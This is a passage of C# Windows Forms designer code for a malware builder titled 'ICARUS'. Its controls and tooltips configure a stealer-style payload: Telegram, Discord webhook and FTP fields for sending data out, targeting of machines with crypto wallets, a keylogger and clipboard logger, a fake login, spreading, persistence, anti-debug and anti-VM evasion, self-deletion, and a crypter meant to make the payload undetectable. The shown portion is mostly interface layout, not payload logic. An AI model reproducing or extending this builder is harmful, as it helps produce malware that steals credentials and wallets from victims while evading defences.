            ShitarusPrivate.Bloom bloom153 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom154 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom155 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom156 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom157 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom158 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom159 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom160 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom161 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom162 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom163 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom164 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom165 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom166 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom167 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom168 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom169 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom170 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom171 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom172 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom173 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom174 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom175 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom176 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom177 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom178 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom179 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom180 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom181 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom182 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom183 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom184 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom185 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom186 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom187 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom188 = new ShitarusPrivate.Bloom();
            ShitarusPrivate.Bloom bloom189 = new ShitarusPrivate.Bloom();
            this.toolTip1 = new System.Windows.Forms.ToolTip(this.components);
            this.txtTGTOKEN = new System.Windows.Forms.TextBox();
            this.txtTGID = new System.Windows.Forms.TextBox();
            this.chkNet4 = new ShitarusPrivate.JCS.ToggleSwitch();
            this.label8 = new System.Windows.Forms.Label();
            this.chkNet2 = new ShitarusPrivate.JCS.ToggleSwitch();
            this.label9 = new System.Windows.Forms.Label();
            this.toggleButtonicon = new ShitarusPrivate.JCS.ToggleSwitch();
            this.txtIcon = new System.Windows.Forms.TextBox();
            this.label7 = new System.Windows.Forms.Label();
            this.primeButton3 = new ShitarusPrivate.PrimeButton();
            this.label17 = new System.Windows.Forms.Label();
            this.chkTargetWallets = new ShitarusPrivate.JCS.ToggleSwitch();
            this.chkASDoc = new ShitarusPrivate.JCS.ToggleSwitch();
            this.selfDelete = new ShitarusPrivate.JCS.ToggleSwitch();
            this.hidden = new ShitarusPrivate.JCS.ToggleSwitch();
            this.label12 = new System.Windows.Forms.Label();
            this.label13 = new System.Windows.Forms.Label();
            this.antiDebug = new ShitarusPrivate.JCS.ToggleSwitch();
            this.label14 = new System.Windows.Forms.Label();
            this.label15 = new System.Windows.Forms.Label();
            this.label18 = new System.Windows.Forms.Label();
            this.antiVM = new ShitarusPrivate.JCS.ToggleSwitch();
            this.chkCrypter = new ShitarusPrivate.JCS.ToggleSwitch();
            this.chkAdvanceBotK = new ShitarusPrivate.JCS.ToggleSwitch();
            this.label28 = new System.Windows.Forms.Label();
            this.chkBotK = new ShitarusPrivate.JCS.ToggleSwitch();
            this.label27 = new System.Windows.Forms.Label();
            this.chkVBS = new ShitarusPrivate.JCS.ToggleSwitch();
            this.label26 = new System.Windows.Forms.Label();
            this.label11 = new System.Windows.Forms.Label();
            this.chkUCA = new ShitarusPrivate.JCS.ToggleSwitch();
            this.chkWDEX = new ShitarusPrivate.JCS.ToggleSwitch();
            this.label2 = new System.Windows.Forms.Label();
            this.chkMacro = new ShitarusPrivate.JCS.ToggleSwitch();
            this.chkObf = new ShitarusPrivate.JCS.ToggleSwitch();
            this.label1 = new System.Windows.Forms.Label();
            this.label16 = new System.Windows.Forms.Label();
            this.label20 = new System.Windows.Forms.Label();
            this.chkStartup = new ShitarusPrivate.JCS.ToggleSwitch();
            this.chkFakeLogin = new ShitarusPrivate.JCS.ToggleSwitch();
            this.label6 = new System.Windows.Forms.Label();
            this.label19 = new System.Windows.Forms.Label();
            this.chkWatcher = new ShitarusPrivate.JCS.ToggleSwitch();
            this.chkBin = new ShitarusPrivate.JCS.ToggleSwitch();
            this.chkBatch = new ShitarusPrivate.JCS.ToggleSwitch();
            this.label10 = new System.Windows.Forms.Label();
            this.label4 = new System.Windows.Forms.Label();
            this.label21 = new System.Windows.Forms.Label();
            this.label32 = new System.Windows.Forms.Label();
            this.chkSpread = new ShitarusPrivate.JCS.ToggleSwitch();
            this.primeButton4 = new ShitarusPrivate.PrimeButton();
            this.txtDiscFilePath = new System.Windows.Forms.TextBox();
            this.txtDiscordFilename = new System.Windows.Forms.TextBox();
            this.txtDiscMessage = new System.Windows.Forms.TextBox();
            this.chkExecS = new ShitarusPrivate.JCS.ToggleSwitch();
            this.label36 = new System.Windows.Forms.Label();
            this.txtUrl = new System.Windows.Forms.TextBox();
            this.txtIconPath = new System.Windows.Forms.TextBox();
            this.chkSpoof = new ShitarusPrivate.JCS.ToggleSwitch();
            this.label37 = new System.Windows.Forms.Label();
            this.txtSname = new System.Windows.Forms.TextBox();
            this.txtSdesc = new System.Windows.Forms.TextBox();
            this.chkKlogger = new ShitarusPrivate.JCS.ToggleSwitch();
            this.label22 = new System.Windows.Forms.Label();
            this.label23 = new System.Windows.Forms.Label();
            this.chkClogger = new ShitarusPrivate.JCS.ToggleSwitch();
            this.toggleSwitch1 = new ShitarusPrivate.JCS.ToggleSwitch();
            this.label24 = new System.Windows.Forms.Label();
            this.btnBinderBrowse = new ShitarusPrivate.PrimeButton();
            this.btnBinderDelete = new ShitarusPrivate.PrimeButton();
            this.txtWebHook = new System.Windows.Forms.TextBox();
            this.primeTheme1 = new ShitarusPrivate.PrimeTheme();
            this.ambianceTabControl1 = new ShitarusPrivate.Zeroit.Framework.UIThemes.Ambience.AmbianceTabControl();
            this.tabPage1 = new System.Windows.Forms.TabPage();
            this.label30 = new System.Windows.Forms.Label();
            this.ambianceSeparator2 = new ShitarusPrivate.Zeroit.Framework.UIThemes.Ambience.AmbianceSeparator();
            this.label25 = new System.Windows.Forms.Label();
            this.chkExcel = new System.Windows.Forms.CheckBox();
            this.chkDoc = new System.Windows.Forms.CheckBox();
            this.pictureBoxicon = new System.Windows.Forms.PictureBox();
            this.label29 = new System.Windows.Forms.Label();
            this.ambianceSeparator1 = new ShitarusPrivate.Zeroit.Framework.UIThemes.Ambience.AmbianceSeparator();
            this.txtMutex = new System.Windows.Forms.TextBox();
            this.button3 = new ShitarusPrivate.StudioButton();
            this.button2 = new ShitarusPrivate.StudioButton();
            this.comboBox1 = new ShitarusPrivate.RJCodeAdvance.RJControls.RJComboBox();
            this.txtFolder = new System.Windows.Forms.TextBox();
            this.txtFilename = new System.Windows.Forms.TextBox();
            this.txtIP = new System.Windows.Forms.TextBox();
            this.primeButton1 = new ShitarusPrivate.PrimeButton();
            this.primeButton2 = new ShitarusPrivate.PrimeButton();
            this.txtIdentifier = new System.Windows.Forms.TextBox();
            this.txtPORT = new System.Windows.Forms.TextBox();
            this.label5 = new System.Windows.Forms.Label();
            this.tabPage2 = new System.Windows.Forms.TabPage();
            this.studioButton2 = new ShitarusPrivate.StudioButton();
            this.txtPHPLINK = new System.Windows.Forms.TextBox();
            this.txtFTPPASS = new System.Windows.Forms.TextBox();
            this.txtFTPUSER = new System.Windows.Forms.TextBox();
            this.txtFTPHOST = new System.Windows.Forms.TextBox();
            this.tabPage3 = new System.Windows.Forms.TabPage();
            this.xorEncryption = new System.Windows.Forms.CheckBox();
            this.groupBox1 = new System.Windows.Forms.GroupBox();
            this.aesEncryption = new System.Windows.Forms.CheckBox();
            this.key1 = new System.Windows.Forms.TextBox();
            this.key2 = new System.Windows.Forms.TextBox();
            this.iv1 = new System.Windows.Forms.TextBox();
            this.iv6 = new System.Windows.Forms.TextBox();
            this.refreshKeys = new ShitarusPrivate.StudioButton();
            this.tabPage4 = new System.Windows.Forms.TabPage();
            this.label35 = new System.Windows.Forms.Label();
            this.groupBox2 = new System.Windows.Forms.GroupBox();
            this.groupBox3 = new System.Windows.Forms.GroupBox();
            this.label34 = new System.Windows.Forms.Label();
            this.label33 = new System.Windows.Forms.Label();
            this.tabPage5 = new System.Windows.Forms.TabPage();
            this.label38 = new System.Windows.Forms.Label();
            this.listBox1 = new System.Windows.Forms.ListBox();
            this.rjComboBox1 = new System.Windows.Forms.ComboBox();
            this.label31 = new System.Windows.Forms.Label();
            this.pictureBox5 = new System.Windows.Forms.PictureBox();
            this.pictureBox4 = new System.Windows.Forms.PictureBox();
            this.pictureBox3 = new System.Windows.Forms.PictureBox();
            this.listBox2 = new System.Windows.Forms.ListBox();
            this.pictureBox2 = new System.Windows.Forms.PictureBox();
            this.linkLabel1 = new System.Windows.Forms.LinkLabel();
            this.button1 = new ShitarusPrivate.PrimeButton();
            this.tabPage6 = new System.Windows.Forms.TabPage();
            this.iconPreview = new System.Windows.Forms.PictureBox();
            this.studioButton1 = new ShitarusPrivate.StudioButton();
            this.btnBrowseIcon = new ShitarusPrivate.PrimeButton();
            this.label3 = new System.Windows.Forms.Label();
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.studioButton5 = new ShitarusPrivate.StudioButton();
            this.studioButton4 = new ShitarusPrivate.StudioButton();
            this.primeTheme1.SuspendLayout();
            this.ambianceTabControl1.SuspendLayout();
            this.tabPage1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBoxicon)).BeginInit();
            this.tabPage2.SuspendLayout();
            this.tabPage3.SuspendLayout();
            this.groupBox1.SuspendLayout();
            this.tabPage4.SuspendLayout();
            this.groupBox2.SuspendLayout();
            this.groupBox3.SuspendLayout();
            this.tabPage5.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox5)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox4)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox3)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).BeginInit();
            this.tabPage6.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.iconPreview)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
            this.SuspendLayout();
            // 
            // toolTip1
            // 
            this.toolTip1.ToolTipIcon = System.Windows.Forms.ToolTipIcon.Info;
            this.toolTip1.ToolTipTitle = "ICARUS";
            // 
            // txtTGTOKEN
            // 
            this.txtTGTOKEN.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.txtTGTOKEN.Location = new System.Drawing.Point(402, 228);
            this.txtTGTOKEN.Multiline = true;
            this.txtTGTOKEN.Name = "txtTGTOKEN";
            this.txtTGTOKEN.Size = new System.Drawing.Size(250, 30);
            this.txtTGTOKEN.TabIndex = 107;
            this.txtTGTOKEN.Text = "Token (optional)";
            this.toolTip1.SetToolTip(this.txtTGTOKEN, "If you use Crypter Service just make sure you add a .ico and not a exe!");
            // 
            // txtTGID
            // 
            this.txtTGID.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.txtTGID.Location = new System.Drawing.Point(402, 192);
            this.txtTGID.Multiline = true;
            this.txtTGID.Name = "txtTGID";
            this.txtTGID.Size = new System.Drawing.Size(250, 30);
            this.txtTGID.TabIndex = 105;
            this.txtTGID.Text = "Chat ID (optional)";
            this.toolTip1.SetToolTip(this.txtTGID, "If you use Crypter Service just make sure you add a .ico and not a exe!");
            // 
            // chkNet4
            // 
            this.chkNet4.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.chkNet4.BackColor = System.Drawing.Color.Transparent;
            this.chkNet4.Location = new System.Drawing.Point(847, 470);
            this.chkNet4.Name = "chkNet4";
            this.chkNet4.OffFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.chkNet4.OnFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.chkNet4.Size = new System.Drawing.Size(50, 19);
            this.chkNet4.Style = ShitarusPrivate.JCS.ToggleSwitch.ToggleSwitchStyle.OSX;
            this.chkNet4.TabIndex = 60;
            this.toolTip1.SetToolTip(this.chkNet4, "Choose Net4 if you run  payload on Windows 10/11!");
            this.chkNet4.CheckedChanged += new ShitarusPrivate.JCS.ToggleSwitch.CheckedChangedDelegate(this.chkNet4_CheckedChanged);
            // 
            // label8
            // 
            this.label8.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.label8.AutoSize = true;
            this.label8.Location = new System.Drawing.Point(899, 475);
            this.label8.Name = "label8";
            this.label8.Size = new System.Drawing.Size(37, 13);
            this.label8.TabIndex = 59;
            this.label8.Text = "Net 4";
            this.toolTip1.SetToolTip(this.label8, "Choose Net4 if you run  payload on Windows 10/11!");
            // 
            // chkNet2
            // 
            this.chkNet2.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.chkNet2.BackColor = System.Drawing.Color.Transparent;
            this.chkNet2.Location = new System.Drawing.Point(955, 469);
            this.chkNet2.Name = "chkNet2";
            this.chkNet2.OffFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.chkNet2.OnFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.chkNet2.Size = new System.Drawing.Size(50, 19);
            this.chkNet2.Style = ShitarusPrivate.JCS.ToggleSwitch.ToggleSwitchStyle.OSX;
            this.chkNet2.TabIndex = 58;
            this.toolTip1.SetToolTip(this.chkNet2, "Choose Net2 if you run the payload on Windows 7!");
            this.chkNet2.CheckedChanged += new ShitarusPrivate.JCS.ToggleSwitch.CheckedChangedDelegate(this.chkNet2_CheckedChanged);
            // 
            // label9
            // 
            this.label9.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.label9.AutoSize = true;
            this.label9.Location = new System.Drawing.Point(1005, 474);
            this.label9.Name = "label9";
            this.label9.Size = new System.Drawing.Size(37, 13);
            this.label9.TabIndex = 57;
            this.label9.Text = "Net 2";
            this.toolTip1.SetToolTip(this.label9, "Choose Net2 if you run the payload on Windows 7!");
            // 
            // toggleButtonicon
            // 
            this.toggleButtonicon.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.toggleButtonicon.BackColor = System.Drawing.Color.Transparent;
            this.toggleButtonicon.Location = new System.Drawing.Point(271, 467);
            this.toggleButtonicon.Name = "toggleButtonicon";
            this.toggleButtonicon.OffFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.toggleButtonicon.OnFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.toggleButtonicon.Size = new System.Drawing.Size(50, 19);
            this.toggleButtonicon.Style = ShitarusPrivate.JCS.ToggleSwitch.ToggleSwitchStyle.OSX;
            this.toggleButtonicon.TabIndex = 55;
            this.toolTip1.SetToolTip(this.toggleButtonicon, "Make sure to enable and add here a .ico else builder will fail!");
            this.toggleButtonicon.CheckedChanged += new ShitarusPrivate.JCS.ToggleSwitch.CheckedChangedDelegate(this.toggleButtonicon_CheckedChanged);
            // 
            // txtIcon
            // 
            this.txtIcon.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.txtIcon.Enabled = false;
            this.txtIcon.Location = new System.Drawing.Point(271, 431);
            this.txtIcon.Multiline = true;
            this.txtIcon.Name = "txtIcon";
            this.txtIcon.Size = new System.Drawing.Size(440, 30);
            this.txtIcon.TabIndex = 52;
            this.txtIcon.Text = "ICON";
            this.toolTip1.SetToolTip(this.txtIcon, "Make sure to enable and add here a .ico else builder will fail!");
            // 
            // label7
            // 
            this.label7.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.label7.AutoSize = true;
            this.label7.Location = new System.Drawing.Point(327, 473);
            this.label7.Name = "label7";
            this.label7.Size = new System.Drawing.Size(92, 13);
            this.label7.TabIndex = 56;
            this.label7.Text = "Enable/Disable";
            this.toolTip1.SetToolTip(this.label7, "Enable /Disable Custom icon ,without this your builder");
            // 
            // primeButton3
            // 
            this.primeButton3.Anchor = System.Windows.Forms.AnchorStyles.Top;
            bloom1.Name = "DownGradient1";
            bloom1.Value = System.Drawing.Color.FromArgb(((int)(((byte)(215)))), ((int)(((byte)(215)))), ((int)(((byte)(215)))));
            bloom2.Name = "DownGradient2";
            bloom2.Value = System.Drawing.Color.FromArgb(((int)(((byte)(235)))), ((int)(((byte)(235)))), ((int)(((byte)(235)))));
            bloom3.Name = "NoneGradient1";
            bloom3.Value = System.Drawing.Color.FromArgb(((int)(((byte)(235)))), ((int)(((byte)(235)))), ((int)(((byte)(235)))));
            bloom4.Name = "NoneGradient2";
            bloom4.Value = System.Drawing.Color.FromArgb(((int)(((byte)(215)))), ((int)(((byte)(215)))), ((int)(((byte)(215)))));
            bloom5.Name = "NoneGradient3";
            bloom5.Value = System.Drawing.Color.FromArgb(((int)(((byte)(252)))), ((int)(((byte)(252)))), ((int)(((byte)(252)))));
            bloom6.Name = "NoneGradient4";
            bloom6.Value = System.Drawing.Color.FromArgb(((int)(((byte)(242)))), ((int)(((byte)(242)))), ((int)(((byte)(242)))));
            bloom7.Name = "Glow";
            bloom7.Value = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom8.Name = "TextShade";
            bloom8.Value = System.Drawing.Color.White;
            bloom9.Name = "Text";
            bloom9.Value = System.Drawing.Color.FromArgb(((int)(((byte)(80)))), ((int)(((byte)(80)))), ((int)(((byte)(80)))));
            bloom10.Name = "Border1";
            bloom10.Value = System.Drawing.Color.White;
            bloom11.Name = "Border2";
            bloom11.Value = System.Drawing.Color.FromArgb(((int)(((byte)(180)))), ((int)(((byte)(180)))), ((int)(((byte)(180)))));
            this.primeButton3.Colors = new ShitarusPrivate.Bloom[] {
        bloom1,
        bloom2,
        bloom3,
        bloom4,
        bloom5,
        bloom6,
        bloom7,
        bloom8,
        bloom9,
        bloom10,
        bloom11};
            this.primeButton3.Customization = "19fX/+vr6//r6+v/19fX//z8/P/y8vL/////Mv////9QUFD//////7S0tP8=";
            this.primeButton3.Font = new System.Drawing.Font("Verdana", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.primeButton3.Image = null;
            this.primeButton3.Location = new System.Drawing.Point(189, 431);
            this.primeButton3.Name = "primeButton3";
            this.primeButton3.NoRounding = false;
            this.primeButton3.Size = new System.Drawing.Size(71, 30);
            this.primeButton3.TabIndex = 54;
            this.primeButton3.Text = "Set Icon";
            this.toolTip1.SetToolTip(this.primeButton3, "Make sure to enable and add here a .ico else builder will fail!");
            this.primeButton3.Transparent = false;
            this.primeButton3.Click += new System.EventHandler(this.primeButton3_Click);
            // 
            // label17
            // 
            this.label17.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.label17.AutoSize = true;
            this.label17.Location = new System.Drawing.Point(257, 511);
            this.label17.Name = "label17";
            this.label17.Size = new System.Drawing.Size(86, 13);
            this.label17.TabIndex = 103;
            this.label17.Text = "Target Crypto";
            this.toolTip1.SetToolTip(this.label17, "This will make payload run only on bots that have wallets installed!");
            // 
            // chkTargetWallets
            // 
            this.chkTargetWallets.BackColor = System.Drawing.Color.Transparent;
            this.chkTargetWallets.Location = new System.Drawing.Point(206, 508);
            this.chkTargetWallets.Name = "chkTargetWallets";
            this.chkTargetWallets.OffFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.chkTargetWallets.OnFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.chkTargetWallets.Size = new System.Drawing.Size(50, 19);
            this.chkTargetWallets.Style = ShitarusPrivate.JCS.ToggleSwitch.ToggleSwitchStyle.OSX;
            this.chkTargetWallets.TabIndex = 113;
            this.toolTip1.SetToolTip(this.chkTargetWallets, "This will make payload run only on bots that have wallets installed!");
            // 
            // chkASDoc
            // 
            this.chkASDoc.BackColor = System.Drawing.Color.Transparent;
            this.chkASDoc.Enabled = false;
            this.chkASDoc.Location = new System.Drawing.Point(881, 486);
            this.chkASDoc.Name = "chkASDoc";
            this.chkASDoc.OffFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.chkASDoc.OnFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.chkASDoc.Size = new System.Drawing.Size(50, 19);
            this.chkASDoc.Style = ShitarusPrivate.JCS.ToggleSwitch.ToggleSwitchStyle.OSX;
            this.chkASDoc.TabIndex = 102;
            this.toolTip1.SetToolTip(this.chkASDoc, "Coming Soon!\r\n");
            this.chkASDoc.Visible = false;
            this.chkASDoc.CheckedChanged += new ShitarusPrivate.JCS.ToggleSwitch.CheckedChangedDelegate(this.chkASDoc_CheckedChanged);
            // 
            // selfDelete
            // 
            this.selfDelete.BackColor = System.Drawing.Color.Transparent;
            this.selfDelete.Enabled = false;
            this.selfDelete.Location = new System.Drawing.Point(21, 24);
            this.selfDelete.Name = "selfDelete";
            this.selfDelete.OffFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.selfDelete.OnFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.selfDelete.Size = new System.Drawing.Size(50, 19);
            this.selfDelete.Style = ShitarusPrivate.JCS.ToggleSwitch.ToggleSwitchStyle.OSX;
            this.selfDelete.TabIndex = 84;
            this.toolTip1.SetToolTip(this.selfDelete, "Batch option self delete payload after run!");
            // 
            // hidden
            // 
            this.hidden.BackColor = System.Drawing.Color.Transparent;
            this.hidden.Enabled = false;
            this.hidden.Location = new System.Drawing.Point(21, 54);
            this.hidden.Name = "hidden";
            this.hidden.OffFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.hidden.OnFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.hidden.Size = new System.Drawing.Size(50, 19);
            this.hidden.Style = ShitarusPrivate.JCS.ToggleSwitch.ToggleSwitchStyle.OSX;
            this.hidden.TabIndex = 82;
            this.toolTip1.SetToolTip(this.hidden, "Batch option hide payload file after run!");
            // 
            // label12
            // 
            this.label12.AutoSize = true;
            this.label12.Location = new System.Drawing.Point(72, 57);
            this.label12.Name = "label12";
            this.label12.Size = new System.Drawing.Size(46, 13);
            this.label12.TabIndex = 83;
            this.label12.Text = "Hidden";
            this.toolTip1.SetToolTip(this.label12, "Batch option hide payload file after run!");
            // 
            // label13
            // 
            this.label13.AutoSize = true;
            this.label13.Location = new System.Drawing.Point(72, 27);
            this.label13.Name = "label13";
            this.label13.Size = new System.Drawing.Size(70, 13);
            this.label13.TabIndex = 85;
            this.label13.Text = "Self Delete";
            this.toolTip1.SetToolTip(this.label13, "Batch option self delete payload after run!");
            // 
            // antiDebug
            // 
            this.antiDebug.BackColor = System.Drawing.Color.Transparent;
            this.antiDebug.Enabled = false;
            this.antiDebug.Location = new System.Drawing.Point(191, 24);
            this.antiDebug.Name = "antiDebug";
            this.antiDebug.OffFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.antiDebug.OnFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.antiDebug.Size = new System.Drawing.Size(50, 19);
            this.antiDebug.Style = ShitarusPrivate.JCS.ToggleSwitch.ToggleSwitchStyle.OSX;
            this.antiDebug.TabIndex = 86;
            this.toolTip1.SetToolTip(this.antiDebug, "Anti debug will protect your payload from being decompiled!");
            // 
            // label14
            // 
            this.label14.AutoSize = true;
            this.label14.Location = new System.Drawing.Point(241, 27);
            this.label14.Name = "label14";
            this.label14.Size = new System.Drawing.Size(70, 13);
            this.label14.TabIndex = 87;
            this.label14.Text = "Anti Debug";
            this.toolTip1.SetToolTip(this.label14, "Anti debug will protect your payload from being decompiled!");
            // 
            // label15
            // 
            this.label15.AutoSize = true;
            this.label15.Location = new System.Drawing.Point(241, 58);
            this.label15.Name = "label15";
            this.label15.Size = new System.Drawing.Size(46, 13);
            this.label15.TabIndex = 89;
            this.label15.Text = "AntiVM";
            this.toolTip1.SetToolTip(this.label15, "Anti vm with make your payload to not run under vm\'s.");
            // 
            // label18
            // 
            this.label18.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.label18.AutoSize = true;
            this.label18.Location = new System.Drawing.Point(931, 517);
            this.label18.Name = "label18";
            this.label18.Size = new System.Drawing.Size(98, 13);
            this.label18.TabIndex = 95;
            this.label18.Text = "Crypter Service";
            this.toolTip1.SetToolTip(this.label18, "Enable Crypter service to make your payload fud!");
            this.label18.Visible = false;
            // 
            // antiVM
            // 
            this.antiVM.BackColor = System.Drawing.Color.Transparent;
            this.antiVM.Enabled = false;
            this.antiVM.Location = new System.Drawing.Point(191, 54);
            this.antiVM.Name = "antiVM";
            this.antiVM.OffFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.antiVM.OnFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.antiVM.Size = new System.Drawing.Size(50, 19);
            this.antiVM.Style = ShitarusPrivate.JCS.ToggleSwitch.ToggleSwitchStyle.OSX;
            this.antiVM.TabIndex = 88;
            this.toolTip1.SetToolTip(this.antiVM, "Anti vm with make your payload to not run under vm\'s.");
            // 
            // chkCrypter
            // 
            this.chkCrypter.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.chkCrypter.BackColor = System.Drawing.Color.Transparent;
            this.chkCrypter.Location = new System.Drawing.Point(881, 514);
            this.chkCrypter.Name = "chkCrypter";
            this.chkCrypter.OffFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.chkCrypter.OnFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.chkCrypter.Size = new System.Drawing.Size(50, 19);
            this.chkCrypter.Style = ShitarusPrivate.JCS.ToggleSwitch.ToggleSwitchStyle.OSX;
            this.chkCrypter.TabIndex = 94;
            this.toolTip1.SetToolTip(this.chkCrypter, "Enable Crypter service to make your payload fud!");
            this.chkCrypter.Visible = false;
            // 
            // chkAdvanceBotK
            // 
            this.chkAdvanceBotK.BackColor = System.Drawing.Color.Transparent;
            this.chkAdvanceBotK.Location = new System.Drawing.Point(94, 70);
            this.chkAdvanceBotK.Name = "chkAdvanceBotK";
            this.chkAdvanceBotK.OffFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.chkAdvanceBotK.OnFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
